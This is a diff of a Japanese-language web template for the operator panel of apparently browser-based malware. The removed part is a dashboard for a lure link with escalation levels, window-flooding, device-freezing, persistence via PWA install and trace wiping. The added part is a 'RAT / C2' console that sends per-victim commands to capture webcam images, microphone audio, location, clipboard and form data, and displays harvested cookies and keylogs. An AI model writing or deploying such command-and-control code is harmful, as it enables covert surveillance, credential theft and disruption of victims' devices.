@@ -1,275 +1,140 @@
-<!doctype html>
-<html lang="ja"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>{{ link.name }} — 監視室</title>
-<style>
-html,body{margin:0;background:#0f1115;color:#e6e9ef;
-  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;padding:14px}
-h1{font-size:18px}
-h3{font-size:14px;margin:18px 0 6px;color:#c7cddb}
-.dim{color:#8b93a7;font-size:12px;line-height:1.85}
-.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#8b93a7}
-.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:12px;margin:8px 0}
-a.btn,button{padding:7px 13px;border-radius:8px;background:#2b3346;color:#e6e9ef;
-  text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer}
-a.go{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
-button.fire{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:700;padding:10px 18px}
-button.stop{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
-button.boom{background:#7a1f1f;border-color:#c0392b;color:#ffd9d9;font-weight:700}
-button.wipe{background:#3a2a5a;border-color:#6a4fbf;color:#e0d9ff}
-.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
-.tabs{display:flex;gap:6px;margin:6px 0 12px;flex-wrap:wrap}
-.tabs a{padding:7px 14px;border-radius:999px;background:#20242e;border:1px solid #39415a;
-  color:#c7cddb;text-decoration:none;font-size:12.5px}
-.tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
-table{width:100%;border-collapse:collapse;font-size:12px}
-th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #232734;vertical-align:top}
-details{margin:6px 0;background:#11141a;border:1px solid #232734;border-radius:8px;padding:8px}
-summary{cursor:pointer;font-size:12.5px}
-.kv{display:grid;grid-template-columns:190px 1fr;gap:2px 8px;font-size:11.5px;margin-top:6px}
-.kv .k{color:#8b93a7;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
-.kv .v{color:#c7cddb;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
-img.shot{max-width:240px;border-radius:8px;border:1px solid #262b36;display:block;margin-top:6px}
-input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#9aa3b2;
-  padding:7px 9px;background:#11141a;border:1px solid #262b36;border-radius:6px}
-select,input[type=text]{padding:5px 8px;background:#11141a;color:#e6e9ef;
-  border:1px solid #262b36;border-radius:6px}
-form.inline{display:inline;margin:0}
-.caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
-  padding:8px 10px;font-size:12px;line-height:1.7;margin:8px 0}
-.panel{background:#141b28;border:1px solid #2b3a5a;border-radius:10px;padding:12px;margin:10px 0}
-.panel h3{margin:0 0 8px;color:#bcd0f0}
-.seg{display:inline-flex;border:1px solid #39415a;border-radius:8px;overflow:hidden}
-.seg label{padding:0;font-size:12.5px;background:#20242e;color:#c7cddb;cursor:pointer}
-.seg input{display:none}
-.seg input:checked + span{background:#4c8dff;color:#fff}
-.seg span{display:block;padding:7px 13px}
-.state{display:inline-block;font-size:11px;padding:2px 10px;border-radius:999px;
-  background:#20242e;border:1px solid #39415a;color:#c7cddb}
-.state.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
-.state.off{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
-.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
-.chk input{width:auto}
-.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
-  background:#20242e;border:1px solid #39415a;color:#c7cddb}
-.badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
-.badge.usb{background:#0f1b28;border-color:#2b5a8a;color:#9fd0ff}
-.sg{background:#101d18;border:1px solid #1f5c42}
-.sg h3{color:#7ee08a}
-.lvl{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px}
-.lvl form{margin:0}
-.lvl button{min-width:46px;text-align:center;padding:8px 6px;line-height:1.25}
-.lvl button.on{background:#00ff88;border-color:#00ff88;color:#062;font-weight:700}
-</style></head><body>
-
-<div class="tabs">
-  <a href="{{ base }}/vp" class="on">🦠 兵器庫</a>
-  <a href="{{ base }}/gp">🆕 GPS</a>
-  <a href="{{ base }}/tracks">🗄 旧式</a>
-</div>
-
-<h1>{{ link.name }} <span class="mono">{{ code }}</span></h1>
-<div class="dim">{{ mode_label }} / 踏まれた回数 {{ total }} /
-  {{ '有効' if link.active else '無効' }} /
-  <span class="state {{ 'on' if firing else 'off' }}">{{ '稼働中' if firing else '停止中' }}</span></div>
-<div class="dim">{{ mode_desc }}</div>
-{% if caution %}<div class="caution">{{ caution }}</div>{% endif %}
-
+{# ===================== SINGULARITY v3 RATコンソール（追記） ===================== #}
 {% if is_sg %}
-<div class="panel sg">
-  <h3>◎ SINGULARITY 制御盤 — 現在 L{{ level }}「{{ level_label }}」</h3>
-  <div class="dim">{{ level_desc }}</div>
-  <div class="lvl">
-    {% for l in levels %}
-    <form method="post" action="/vp/{{ code }}/level">
-      <input type="hidden" name="level" value="{{ l }}">
-      <button type="submit" class="{{ 'on' if level == l else '' }}">L{{ l }}<br>
-        <span style="font-size:10px">{{ ['偵察','標準','加熱','制圧','焦土','特異点'][l] }}</span>
-      </button>
-    </form>
-    {% endfor %}
+<style>
+.x-wrap{margin:14px 0;background:#0f1218;border:1px solid #23303f;border-radius:12px;padding:14px}
+.x-wrap h3{margin:0 0 10px;font-size:14px;color:#7ee08a}
+.x-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:8px 0}
+.x-wrap select,.x-wrap input{background:#0b0e13;color:#dfe7f2;border:1px solid #26313f;
+  border-radius:7px;padding:7px 9px;font:12px ui-monospace,Menlo,monospace}
+.x-wrap button{background:#182231;color:#dfe7f2;border:1px solid #2b3a4d;border-radius:8px;
+  padding:7px 12px;font-size:12px;font-weight:600;cursor:pointer}
+.x-wrap button.hot{background:#00c46a;border-color:#00c46a;color:#04240f}
+.x-wrap button.red{background:#7a1f1f;border-color:#a33;color:#ffd9d9}
+.x-out{margin-top:10px;background:#080a0e;border:1px solid #1d2632;border-radius:8px;
+  padding:10px;font:11.5px/1.7 ui-monospace,Menlo,monospace;color:#9fb4cc;
+  white-space:pre-wrap;max-height:340px;overflow:auto}
+.x-shot{max-width:320px;border:1px solid #26313f;border-radius:8px;margin-top:8px;display:block}
+.x-k{color:#7ee08a}
+.x-d{color:#54718f}
+</style>
+<div class="x-wrap">
+  <h3>🎛 RAT / C2 コンソール（v3・個体別）</h3>
+  <div class="x-row">
+    <span class="x-d">対象個体</span>
+    <select id="x-sid">
+      <option value="">（全個体）</option>
+      {% for s in sids %}<option value="{{ s }}">{{ s }}</option>{% endfor %}
+    </select>
+    <button id="x-load" type="button">🔄 取得</button>
+    <button id="x-auto" type="button">▶ 自動更新</button>
+    <button id="x-clr" type="button" class="red">🗑 コマンド履歴消去</button>
   </div>
-  <div class="row">
-    <form method="post" action="/vp/{{ code }}/detonate" style="margin:0">
-      <button class="boom" type="submit">💥 最終形態へ（L5）</button></form>
-    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
-      <input type="hidden" name="freeze" value="">
-      <button type="submit">凍結 自動（既定）</button></form>
-    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
-      <input type="hidden" name="freeze" value="off">
-      <button type="submit">凍結 off</button></form>
-    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
-      <input type="hidden" name="freeze" value="soft">
-      <button type="submit">凍結 soft（約1fps）</button></form>
-    <form method="post" action="/vp/{{ code }}/freeze" style="margin:0">
-      <input type="hidden" name="freeze" value="hard">
-      <button type="submit">凍結 hard（完全停止）</button></form>
-  </div>
-  <div class="row">
-    <form method="post" action="/vp/{{ code }}/wipe" style="margin:0"
-          onsubmit="return confirm('感染端末の痕跡を全部消しますか？（凍結中でも届きます）')">
-      <button class="wipe" type="submit">🧹 痕跡を完全消去（wipe ×{{ wipe_seq }}）</button></form>
-  </div>
-  <div class="dim" style="margin-top:8px">
-    現在の凍結設定: <b>{{ freeze or '自動（L5でsoft）' }}</b>。
-    wipe とレベル変更は <b>Service Worker 経由で navigate させる</b>ので、
-    相手のタブが「応答なし」でも必ず届きます。<br>
-    停止させたいだけなら <b>停止ボタン → そのあと wipe</b> が確実です。
-  </div>
-  <div class="dim" style="margin-top:8px">
-    📲 相手が「今すぐインストール」を押すと <b>PWAとして端末に常駐</b>します。
-    インストール後は最低 <b>L{{ install_level }}</b> で回り続け、
-    OSログイン時にも自動起動します。ストレージも自動で永続化されるため、
-    埋めたディスクは簡単には回収されません。<br>
-    消すには相手が <b>chrome://apps</b> からアンインストール＋サイトデータ消去するか、
-    こちらの <b>wipe</b> が必要です。
-  </div>
-</div>
-{% endif %}
 
-<div class="panel">
-  <h3>🕹 操作盤（こちら側）</h3>
-  <form method="post" action="/vp/{{ code }}/set" class="row">
-    <span class="dim">1セットの枚数（窓爆弾・ミックス用）</span>
-    <span class="seg">
-      <label><input type="radio" name="winset" value="10"
-        {% if winset == 10 %}checked{% endif %}><span>10</span></label>
-      <label><input type="radio" name="winset" value="100"
-        {% if winset == 100 %}checked{% endif %}><span>100</span></label>
-      <label><input type="radio" name="winset" value="0"
-        {% if winset == 0 %}checked{% endif %}><span>∞</span></label>
-    </span>
-    <button type="submit">枚数を保存</button>
-  </form>
-  <div class="row">
-    <form method="post" action="/vp/{{ code }}/fire" style="margin:0">
-      <button class="fire" type="submit">＋1セット出す</button></form>
-    {% if firing %}
-    <form method="post" action="/vp/{{ code }}/stop" style="margin:0">
-      <button class="stop" type="submit">■ 停止</button></form>
-    {% else %}
-    <form method="post" action="/vp/{{ code }}/resume" style="margin:0">
-      <button class="fire" type="submit">▶ 再開</button></form>
-    {% endif %}
+  <div class="x-row">
+    <span class="x-d">捕獲</span>
+    <button data-cmd="shot" type="button">📷 webcam</button>
+    <button data-cmd="mic" type="button">🎙 マイク3秒</button>
+    <button data-cmd="geo" type="button">📍 現在地</button>
+    <button data-cmd="clip" type="button">📋 クリップボード</button>
+    <button data-cmd="dom" type="button">📄 DOM/フォーム</button>
+    <button data-cmd="speak" type="button">🔊 発話</button>
+    <button data-cmd="pip" type="button">🪟 最前面窓</button>
   </div>
-  <div class="dim">開いている相手のページが1.8秒ごとに拾って反応します。今の設定：
-    <b>{{ '∞（止まるまで）' if winset == 0 else winset ~ '枚/セット' }}</b></div>
-</div>
 
-<div class="card">
-  <div class="dim">相手に送るURL（インストール不要。コピー／共有でそのまま渡せます）</div>
-  <div class="row">
-    <input class="url" id="shareurl" readonly value="{{ share }}" onclick="this.select()">
-    <button class="go" id="sharecopy" type="button">コピー</button>
-    <button id="shareshare" type="button">共有</button>
-    <a class="btn go" href="{{ share }}" target="_blank">開いて確認</a>
+  <div class="x-row">
+    <span class="x-d">制御</span>
+    <button data-cmd="freeze" data-arg="soft" type="button">❄ 凍結(soft)</button>
+    <button data-cmd="freeze" data-arg="hard" type="button">❄ 凍結(hard)</button>
+    <button data-cmd="reload" type="button">♻ reload</button>
+    <button data-cmd="update" type="button">⬆ OTA更新</button>
+    <button data-cmd="install" type="button">📲 インストール</button>
+    <button data-cmd="badge" data-arg="9" type="button">🔢 バッジ</button>
+    <button data-cmd="notify" data-arg="感染しました" type="button">🔔 通知</button>
+    <button data-cmd="wipe" type="button" class="red">☠ wipe</button>
   </div>
-  {% if is_new %}<div class="dim" style="color:#7ee08a">✓ 作成しました。上のURLを送ってください。</div>{% endif %}
-  {% if boom %}<div class="dim" style="color:#ff9a9a">💥 最終形態（L5）に移行しました。</div>{% endif %}
-  {% if wiped %}<div class="dim" style="color:#c3b6ff">🧹 wipe を送信しました。相手のタブが開いていれば数十秒で消えます。</div>{% endif %}
-</div>
 
-<h3>踏んだ端末（{{ total }}件）</h3>
-{% for h in hits %}
-<details>
-  <summary>
-    <span class="mono">{{ (h.ts or '')[:19] }}</span> /
-    {{ h.device or '不明' }} {{ h.os or '' }} / {{ h.browser or '不明' }}
-    {% if h.inapp %}（{{ h.inapp }}内）{% endif %}
-    {% if h.city %} / {{ h.city }}{% endif %}
-    {% if h.gps_lat %} / 🛰{{ '%.4f'|format(h.gps_lat) }},{{ '%.4f'|format(h.gps_lon) }}{% endif %}
-    {% set kk = (by_hit.get(h.id, []) | map(attribute='key') | list) %}
-    {% if 'usb' in kk %}<span class="badge usb">🖴 USB</span>{% endif %}
-    {% if 'install.installed' in kk %}<span class="badge on">📲 常駐</span>{% endif %}
-    {% if 'install.available' in kk %}<span class="badge">インストール可</span>{% endif %}
-    {% if 'verdict.resident' in kk %}<span class="badge on">🪟 アプリ窓</span>{% endif %}
-    <span class="mono"> #{{ h.id }}</span>
-  </summary>
-  <div class="kv">
-    <div class="k">IP</div><div class="v">{{ h.ip }}</div>
-    <div class="k">国 / 地域 / 都市</div><div class="v">{{ h.country or '-' }} / {{ h.city or '-' }}</div>
-    <div class="k">ISP</div><div class="v">{{ h.isp or '-' }}</div>
-    <div class="k">識別者ID</div><div class="v">{{ h.vid or '-' }}</div>
-    <div class="k">UA</div><div class="v">{{ h.ua }}</div>
+  <div class="x-row">
+    <span class="x-d">任意</span>
+    <input id="x-arg" placeholder="URL / 文言 / レベル0-6" style="min-width:260px">
+    <button data-cmd="open" data-input="1" type="button">↗ 新窓で開く</button>
+    <button data-cmd="nav" data-input="1" type="button">➡ 遷移</button>
+    <button data-cmd="speak" data-input="1" type="button">🔊 任意文言</button>
+    <button data-cmd="title" data-input="1" type="button">🏷 タイトル書換</button>
   </div>
-  {% set items = by_hit.get(h.id, []) %}
-  {% if items %}
-  <div style="margin-top:8px"><b style="font-size:12px">収集データ {{ items|length }}件</b></div>
-  <div class="kv">
-    {% for d in items %}
-      <div class="k">{{ d.key }}</div>
-      <div class="v">{{ d.value[:400] }}</div>
-      {% if d.key == 'selfie' %}<div class="k"></div><div class="v"><img class="shot" src="{{ d.value }}"></div>{% endif %}
-    {% endfor %}
-  </div>
-  {% else %}
-  <div class="dim" style="margin-top:6px">JSが動く前に離脱したか、データ未着です。</div>
-  {% endif %}
-</details>
-{% else %}
-<p class="dim">まだ踏まれていません。</p>
-{% endfor %}
 
-<h3>設定</h3>
-<form method="post" action="/vp/{{ code }}/update" class="card">
-  <label>名前 <input type="text" name="name" value="{{ link.name }}"></label>
-  <label>兵器
-    <select name="mode">
-      {% for m, label in modes %}
-      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ label }}</option>
-      {% endfor %}
-    </select></label>
-  <label>1セットの枚数
-    <select name="winset">
-      <option value="10" {% if winset == 10 %}selected{% endif %}>10枚</option>
-      <option value="100" {% if winset == 100 %}selected{% endif %}>100枚</option>
-      <option value="0" {% if winset == 0 %}selected{% endif %}>∞（止まるまで）</option>
-    </select></label>
-  <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}"></label>
-  <label>通知文 <input type="text" name="notify_text" value="{{ notify_text }}"></label>
-  <label>その通知でインストールさせる兵器
-    <select name="notify_mode">
-      <option value="" {% if not notify_mode %}selected{% endif %}>なし（自動）</option>
-      {% for m, label in modes %}
-      <option value="{{ m }}" {% if notify_mode == m %}selected{% endif %}>{{ label }}</option>
-      {% endfor %}
-    </select></label>
-  <label class="chk"><input type="checkbox" name="notify" value="1"
-    {% if notify %}checked{% endif %}> 通知バナーを出す</label>
-  <label>メモ <input type="text" name="note" value="{{ link.note or '' }}"></label>
-  <label>状態
-    <select name="active">
-      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
-      <option value="0" {% if not link.active %}selected{% endif %}>無効</option>
-    </select></label>
-  <button type="submit">保存</button>
-</form>
-<div class="row">
-  <form class="inline" method="post" action="/vp/{{ code }}/clear"
-        onsubmit="return confirm('記録を消しますか？')"><button type="submit">記録を消す</button></form>
-  <form class="inline" method="post" action="/vp/{{ code }}/delete"
-        onsubmit="return confirm('削除しますか？')"><button type="submit">削除</button></form>
+  <div class="x-out" id="x-out">（「取得」を押すと、その個体の最新データが出ます）</div>
+  <img id="x-img" class="x-shot" style="display:none" alt="rat">
 </div>
 
 <script>
 (function () {
-  var u = document.getElementById('shareurl').value;
-  function copy(b) {
-    function done() { b.textContent = 'コピーしました';
-      setTimeout(function () { b.textContent = 'コピー'; }, 1500); }
-    function fb() {
-      try { var t = document.createElement('textarea'); t.value = u;
-            t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
-            t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
-    }
-    try { navigator.clipboard && navigator.clipboard.writeText
-            ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  var code = {{ code|tojson }};
+  var $ = function (i) { return document.getElementById(i); };
+  var out = $("x-out"), img = $("x-img"), timer = null;
+
+  function form(action, fields) {
+    var f = document.createElement("form");
+    f.method = "post"; f.action = action;
+    Object.keys(fields).forEach(function (k) {
+      var i = document.createElement("input");
+      i.type = "hidden"; i.name = k; i.value = fields[k] == null ? "" : fields[k];
+      f.appendChild(i);
+    });
+    document.body.appendChild(f); f.submit();
   }
-  document.getElementById('sharecopy').addEventListener('click', function () { copy(this); });
-  document.getElementById('shareshare').addEventListener('click', function () {
-    if (navigator.share) navigator.share({ url: u }).catch(function () {});
-    else copy(document.getElementById('sharecopy'));
+
+  function send(kind, arg) {
+    form("/vp/" + code + "/cmd", { kind: kind, arg: arg || "", sid: $("x-sid").value });
+    out.textContent = "送信: " + kind + (arg ? " (" + arg + ")" : "") + " → " + ($("x-sid").value || "全個体");
+  }
+
+  document.querySelectorAll("[data-cmd]").forEach(function (b) {
+    b.addEventListener("click", function () {
+      var a = b.getAttribute("data-arg") || "";
+      if (b.getAttribute("data-input")) a = $("x-arg").value;
+      send(b.getAttribute("data-cmd"), a);
+    });
   });
+
+  $("x-clr").addEventListener("click", function () {
+    form("/vp/" + code + "/cmds/clear", {});
+  });
+
+  function render(j) {
+    if (!j || !j.ok) { out.textContent = "データなし"; return; }
+    var d = j.data || {}, L = [];
+    var order = ["rat.shot","rat.mic","rat.geo","rat.clip","rat.dom","dom","cookies","keylog",
+                 "crypto.id","sse","peers","bomb","privacy.sw","privacy.periodic","spoof",
+                 "burn.workers","burn.webgpu","worklet","disk.writtenMB","ram.mb","verdict.fingerprintId"];
+    order.forEach(function (k) { if (d[k]) L.push(k); });
+    Object.keys(d).forEach(function (k) { if (L.indexOf(k) < 0) L.push(k); });
+
+    out.innerHTML = L.slice(0, 120).map(function (k) {
+      var v = d[k] && d[k].v;
+      var short = String(v == null ? "" : v);
+      if (k === "rat.shot" || k === "selfie") short = "(画像)";
+      if (k === "rat.mic") short = "(音声 base64 " + short.length + "文字)";
+      if (short.length > 600) short = short.slice(0, 600) + "…";
+      return '<span class="x-k">' + k + '</span> <span class="x-d">' + (d[k] && d[k].ts || "") +
+             '</span>\n' + escape(short);
+    }).join("\n\n");
+
+    var shot = (d["rat.shot"] && d["rat.shot"].v) || (d["selfie"] && d["selfie"].v);
+    if (shot && shot.indexOf("data:") === 0) { img.src = shot; img.style.display = "block"; }
+    else img.style.display = "none";
+  }
+  function escape(s) { return String(s).replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
+
+  function load() {
+    fetch("/api/vp/" + code + "/rat?sid=" + encodeURIComponent($("x-sid").value), { cache: "no-store" })
+      .then(function (r) { return r.json(); }).then(render).catch(function () { out.textContent = "取得失敗"; });
+  }
+  $("x-load").addEventListener("click", load);
+  $("x-auto").addEventListener("click", function () {
+    if (timer) { clearInterval(timer); timer = null; $("x-auto").textContent = "▶ 自動更新"; }
+    else { timer = setInterval(load, 4000); $("x-auto").textContent = "⏸ 自動更新中"; load(); }
+  });
+  $("x-sid").addEventListener("change", load);
 })();
 </script>
-</body></html>
+{% endif %}
